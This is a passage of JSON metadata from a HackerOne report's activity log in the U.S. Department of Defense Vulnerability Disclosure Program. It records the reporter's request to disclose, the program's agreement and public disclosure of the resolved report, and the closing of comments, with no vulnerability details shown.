Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-17T15:02:42.186Z","updated_at":"2020-11-17T15:02:42.186Z","actor":{"username":"s52","cleared":false,"url":"/s52","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"emad777","url":"/emad777"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9846553,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"That's great! \nCan we disclose this report?","markdown_message":"\u003cp\u003eThat\u0026#39;s great! \u003cbr\u003e\nCan we disclose this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-17T16:21:03.263Z","updated_at":"2020-11-17T16:21:03.263Z","first_to_agree":true,"actor":{"username":"emad777","cleared":false,"url":"/emad777","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/333zTf5BgPE3gGuzTgR5ac93/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9902363,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","markdown_message":"\u003cp\u003eThanks for participating in the DoD Vulnerability Disclosure Program. We\u0026#39;re publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at \u003ca title=\"VDP-Questions@dc3.mil\" href=\"mailto:VDP-Questions@dc3.mil\" rel=\"nofollow noopener noreferrer\"\u003eVDP-Questions@dc3.mil\u003c/a\u003e if there are any questions, concerns or issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-23T18:01:30.087Z","updated_at":"2020-11-23T18:01:30.087Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9902364,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T18:01:30.257Z","updated_at":"2020-11-23T18:01:30.257Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9902366,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T18:01:36.486Z","updated_at":"2020-11-23T18:01:36.486Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}